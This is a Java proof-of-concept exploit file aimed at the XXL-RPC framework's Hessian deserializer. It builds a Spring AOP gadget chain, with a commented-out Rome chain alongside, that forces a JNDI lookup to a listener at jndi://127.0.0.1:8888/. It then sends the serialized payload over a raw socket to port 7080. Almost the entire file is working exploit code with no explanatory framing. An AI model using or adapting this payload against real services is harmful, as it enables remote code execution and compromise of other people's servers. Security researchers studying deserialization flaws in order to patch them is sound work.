package com.xxl.rpc.core.poc;

import com.xxl.rpc.serialize.HessianSerializer;
import org.apache.commons.logging.impl.NoOpLog;
import org.springframework.aop.aspectj.AbstractAspectJAdvice;
import org.springframework.aop.aspectj.AspectInstanceFactory;
import org.springframework.aop.aspectj.AspectJAroundAdvice;
import org.springframework.aop.aspectj.AspectJPointcutAdvisor;
import org.springframework.aop.aspectj.annotation.BeanFactoryAspectInstanceFactory;
import org.springframework.aop.target.HotSwappableTargetSource;
import org.springframework.jndi.support.SimpleJndiBeanFactory;

import java.io.OutputStream;
import java.net.Socket;

import static com.xxl.rpc.core.poc.ToStringUtil.makeToStringTrigger;

public class PoC {


    public static void sendEvilPoC() throws Exception {

        // Rome链
        // ToStringBean item = new ToStringBean(com.sun.rowset.JdbcRowSetImpl.class, com.xxl.rpc.core.poc.JDKUtil.makeJNDIRowSet("jndi://127.0.0.1:8888/"));
        //EqualsBean root = new EqualsBean(ToStringBean.class, item);
        Object evilObj; //= com.xxl.rpc.core.poc.JDKUtil.makeMap(root, root);

        // Spring AOP链
        SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
        bf.setShareableResources("jndi://127.0.0.1:8888/");
        Reflections.setFieldValue(bf, "logger", new NoOpLog());
        Reflections.setFieldValue(bf.getJndiTemplate(), "logger", new NoOpLog());

        AspectInstanceFactory aif = Reflections.createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);
        Reflections.setFieldValue(aif, "beanFactory", bf);
        Reflections.setFieldValue(aif, "name", "jndi://127.0.0.1:8888/");
        AbstractAspectJAdvice advice = Reflections.createWithoutConstructor(AspectJAroundAdvice.class);
        Reflections.setFieldValue(advice, "aspectInstanceFactory", aif);

        Reflections.setFieldValue(advice, "declaringClass", Object.class);
        Reflections.setFieldValue(advice, "methodName", "toString");
        Reflections.setFieldValue(advice, "parameterTypes", new Class[0]);

        AspectJPointcutAdvisor advisor = Reflections.createWithoutConstructor(AspectJPointcutAdvisor.class);
        Reflections.setFieldValue(advisor, "advice", advice);

        Class<?> pcahCl = Class
                .forName("org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder");
        Object pcah = Reflections.createWithoutConstructor(pcahCl);
        Reflections.setFieldValue(pcah, "advisor", advisor);

        evilObj = makeSpringAOPToStringTrigger(pcah);

        HessianSerializer serializer = new HessianSerializer();
        byte[] bytes = serializer.serialize(evilObj);

        // Object obj = serializer.deserialize(bytes, Class.class);

        int length = bytes.length;
        byte[] newArray = new byte[length + 4];
        newArray[0] = (byte) ((length >> 24) & 0xFF);
        newArray[1] = (byte) ((length >> 16) & 0xFF);
        newArray[2] = (byte) ((length >> 8) & 0xFF);
        newArray[3] = (byte) (length & 0xFF);
        System.arraycopy(bytes, 0, newArray, 4, length);

        Socket socket = new Socket("127.0.0.1", 7080);



        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(newArray);
        outputStream.flush();
        outputStream.close();

    }

    public static void main(String[] args) throws Exception {
        sendEvilPoC();
    }

    public static Object makeSpringAOPToStringTrigger ( Object o ) throws Exception {
        return makeToStringTrigger(o, x -> {
            return new HotSwappableTargetSource(x);
        });
    }

}
